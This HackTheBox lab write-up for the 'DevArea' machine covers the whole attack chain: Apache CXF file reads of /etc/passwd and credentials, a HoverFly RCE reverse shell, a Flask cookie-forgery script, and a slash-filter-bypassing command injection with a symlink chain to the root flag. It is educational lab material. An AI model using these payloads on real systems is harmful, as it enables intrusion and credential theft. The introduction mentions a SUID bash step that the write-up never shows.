# DevArea — HackTheBox Lab Writeup

## Introduction

**DevArea** is a HackTheBox lab that simulates a realistic developer environment. The full attack path covers network enumeration, FTP anonymous access, Apache CXF exploitation, credential extraction via path traversal, HoverFly middleware RCE, and finally privilege escalation to root via a sudoers misconfiguration and SUID bash abuse.

---

## Step 1 — Reconnaissance with Nmap

Begin with a full port scan to enumerate all open services and their versions:

```bash
nmap -sV -sC -p- --min-rate 5000 <IP_ADDRESS>
```

**Flags explained:**
- `-sV` — Service and version detection
- `-sC` — Run default NSE scripts (banner grabbing, basic enumeration)
- `-p-` — Scan all 65535 ports
- `--min-rate 5000` — Send packets no slower than 5000/sec to speed up the scan

Analyze the output for interesting open ports, running services, and any exposed usernames or hostnames.

---

## Step 2 — FTP Anonymous Login & File Retrieval

After identifying the FTP port and a username of interest from the nmap output, connect via anonymous FTP:

```bash
ftp anonymous@<IP_ADDRESS>
```

Once connected, switch to passive mode (required on HTB networks):

```
ftp> passive
```

Then download the employee JAR file:

```
ftp> get <employee>.jar
```

This JAR file contains application code or configuration that will help identify the next attack surface.

---

## Step 3 — Identifying the Apache CXF Vulnerability

Inspect the downloaded JAR to identify the Apache CXF framework and its version. Look for the Apache folder structure and configuration files within the JAR:

```bash
jar tf <employee>.jar
jar xf <employee>.jar
```

Review the extracted contents to confirm the Apache CXF version and identify the vulnerable endpoint. The version present is affected by **CVE-2022-46364**.

---

## Step 4 — Exploiting CVE-2022-46364 (Apache CXF SSRF/RCE)

**CVE-2022-46364** is a Server-Side Request Forgery vulnerability in Apache CXF that can lead to remote code execution.

Clone the PoC exploit:

```bash
git clone https://github.com/kasem545/CVE-2022-46364-Poc.git
cd CVE-2022-46364-Poc
```

Follow the repository instructions to run the exploit against the target, pointing it at the vulnerable Apache CXF endpoint identified in Step 3.

---

## Step 5 — Credential Extraction via Path Traversal

Using the CVE-2022-46364 exploit, extract sensitive files from the target system.

First, retrieve `/etc/passwd` to enumerate system users:

```
Target path: /etc/passwd
```

Then extract the HoverFly service configuration file to obtain credentials:

```
Target path: /etc/systemd/system/hoverfly.service
```

Inside `hoverfly.service` you will find the **username** and **password** in plaintext within the service definition (e.g., `ExecStart` arguments or environment variables).

---

## Step 6 — HoverFly Web Login (Port 8888)

Add the hostname to your `/etc/hosts` file if not already present:

```bash
echo "<IP_ADDRESS>  devarea.htb" | sudo tee -a /etc/hosts
```

Navigate to the HoverFly admin panel in your browser:

```
http://devarea.htb:8888
```

Log in using the credentials extracted from `hoverfly.service`.

---

## Step 7 — Extracting the API Token via DevTools

Once logged in:

1. Open **Browser DevTools** (`F12`)
2. Go to the **Network** tab
3. **Refresh** the page (`F5`)
4. Inspect the requests and locate the HoverFly API version call
5. Copy the **Bearer token** from the request headers — you will need this for the next exploit

---

## Step 8 — Exploiting CVE-2024-45388 (HoverFly Middleware RCE)

**CVE-2024-45388** is a Remote Code Execution vulnerability in HoverFly's middleware functionality that allows an authenticated attacker to execute arbitrary commands on the server.

Set up a netcat listener on your machine:

```bash
nc -lvnp 4444
```

Run the exploit:

```bash
python3 CVE-2024-45388.py \
  -H devarea.htb \
  -P 8888 \
  --token "<YOUR_TOKEN>" \
  --lhost <YOUR_TUN0_IP> \
  --lport 4444
```

Replace `<YOUR_TOKEN>` with the token copied from DevTools and `<YOUR_TUN0_IP>` with your HTB VPN IP (e.g., `10.10.14.73`).

If successful, a reverse shell will connect back to your listener.

---

## Step 9 — User Flag

Once you have a shell, retrieve the user flag:

```bash
cat ~/user.txt
# or
find / -name "user.txt" 2>/dev/null
```

---

## Step 10 — Privilege Escalation Enumeration

After landing a shell as `dev_ryan`, check what sudo privileges are available:

```bash
sudo -l
```

Output:

```
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
```

**Key observations:**
- `dev_ryan` can run `/opt/syswatch/syswatch.sh` as root **without a password** (`NOPASSWD`)
- `web-stop` and `web-restart` are explicitly **blacklisted** with `!`
- The `plugin`, `logs`, and `web` subcommands are **not blacklisted**

Also note port `7777` is the SysWatch Web GUI running on localhost — accessible only from inside the box:

```bash
ss -tlnp | grep LISTEN
# 127.0.0.1:7777  → SysWatch Web GUI (Python/Flask)
```

---

## Step 11 — Enumerate the ZIP File Near the User Flag

After getting the user flag, look around the home directory for additional files:

```bash
ls -la ~/
find ~/ -name "*.zip" 2>/dev/null
```

You will find a ZIP archive near the user flag. Extract it:

```bash
unzip <archive>.zip -d syswatch
cd syswatch
```

---

## Step 12 — Extract Sensitive Information from the ZIP

Enumerate all interesting files inside the extracted archive:

**Environment file — contains the secret key:**

```bash
cat /etc/syswatch.env
```

This file contains a **secret key** used by the SysWatch Web GUI (Flask session signing key). Note it down — this is the key to forging an authenticated session cookie.

**Plugin scripts — understand how plugins are called:**

```bash
cat /opt/syswatch/plugins/log_monitor.sh
cat /opt/syswatch/plugins/service_monitor.sh
```

**Main configuration:**

```bash
cat syswatch/config/syswatch.conf
```

**Flask web application — understand routes and session handling:**

```bash
cat syswatch/syswatch_gui/app.py
```

Pay close attention to:
- How the session cookie is verified (Flask uses `SECRET_KEY` to sign cookies)
- Which routes are available (e.g., `/service-status`)
- Whether any route passes user input directly to a shell command — **this is the command injection point**

**Database — enumerate users and stored data:**

```bash
sqlite3 syswatch/syswatch_gui/syswatch.db .dump
```

This may reveal **usernames and password hashes** for the web GUI login.

**Setup and monitor scripts:**

```bash
cat syswatch/setup.sh
cat syswatch/monitor.sh
```

---

## Step 13 — Forge a Session Cookie with the Secret Key

Now that you have the Flask `SECRET_KEY` from `syswatch.env`, you can forge a valid signed session cookie to authenticate as any user (e.g., `admin`) without knowing the password.

On your **attack machine**, create `forge.py`:

```python
# forge.py
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = "<KEY_FROM_SYSWATCH_ENV>"

class SimpleApp:
    secret_key = SECRET_KEY
    session_cookie_name = "session"

app = SimpleApp()
si = SecureCookieSessionInterface()
s = si.get_signing_serializer(app)

# Forge a session as admin
payload = {"username": "admin", "logged_in": True}
cookie = s.dumps(payload)
print(cookie)
```

Run it:

```bash
pip install flask itsdangerous
python3 forge.py
```

Copy the output — this is your **forged session cookie**.

---

## Step 14 — Command Injection via SysWatch Web GUI (Port 7777)

The `/service-status` route in `app.py` passes the `service` parameter directly to a shell command as root — this is an **unauthenticated or session-authenticated command injection** vulnerability.

Set your forged cookie as a variable:

```bash
COOKIE="<YOUR_FORGED_COOKIE>"
```

### 1. Create the symlink script on the target (as `dev_ryan`)

Since `/` and `.` characters are filtered in the injection, use shell tricks to construct paths without literal slashes:

```bash
cat > /tmp/make_links << 'EOF'
#!/bin/bash
ln -sf /root/root.txt /opt/syswatch/logs/chain.log
ln -sf chain.log /opt/syswatch/logs/evil.log
EOF
chmod +x /tmp/make_links
```

**Why two symlinks?**

- `chain.log` → points directly to `/root/root.txt`
- `evil.log` → points to `chain.log` (which points to `root.txt`)

This chain is needed because `syswatch.sh logs` only reads from its own logs directory. By pointing a log file at `root.txt` via symlink chain, when syswatch reads `evil.log` as root, it follows the symlinks and reads `/root/root.txt`.

### 2. Execute the script via the web injection

The injection bypasses the slash filter using `$(pwd | cut -c1)` to produce `/` dynamically:

```bash
COOKIE="set-your-cookie-here"
curl -s -b "session=$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode 'service=ssh | $(pwd | cut -c1)tmp$(pwd | cut -c1)make_links'
```

**How the filter bypass works:**

- `pwd` on the target returns `/opt/HoverFly` (or similar)
- `cut -c1` extracts the **first character** — which is always `/`
- So `$(pwd | cut -c1)tmp$(pwd | cut -c1)make_links` evaluates to `/tmp/make_links`
- No literal `/` or `.` appears in the injected string — the filter is bypassed

### 3. Verify the symlinks were created

```bash
curl -s -b "session=$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode 'service=ssh | ls -la $(pwd | cut -c1)opt$(pwd | cut -c1)syswatch$(pwd | cut -c1)logs'
```

Look for:
```
evil.log -> chain.log
chain.log -> /root/root.txt
```

---

## Step 15 — Read the Root Flag via Symlink + sudo logs

Now use the **allowed** sudo command to read `evil.log` as root. Since root follows the symlink chain, it reads `/root/root.txt`:

```bash
sudo /opt/syswatch/syswatch.sh logs evil.log
```

The output will be the **root flag**.

---

## Full Attack Chain Summary

| Step | Technique | CVE / Tool |
|------|-----------|------------|
| 1 | Network enumeration | nmap |
| 2 | Anonymous FTP access + JAR retrieval | ftp |
| 3 | JAR analysis — Apache CXF identification | jar |
| 4 | Apache CXF SSRF/RCE | CVE-2022-46364 |
| 5 | Path traversal — credential extraction | CVE-2022-46364 |
| 6 | HoverFly web login | Port 8888 |
| 7 | API token extraction | Browser DevTools |
| 8 | HoverFly Middleware RCE → reverse shell | CVE-2024-45388 |
| 9 | User flag | — |
| 10 | Sudo enumeration | sudo -l |
| 11 | ZIP enumeration near user flag | unzip |
| 12 | Secret key + source code extraction | cat, sqlite3 |
| 13 | Flask session cookie forgery | forge.py |
| 14 | Command injection via SysWatch GUI (port 7777) + symlink chain | curl + bash |
| 15 | Root flag via sudo logs + symlink traversal | syswatch.sh logs |

---

> **Disclaimer:** This writeup is for educational purposes in the context of the HackTheBox platform only. Do not use these techniques against systems you do not own or have explicit permission to test.
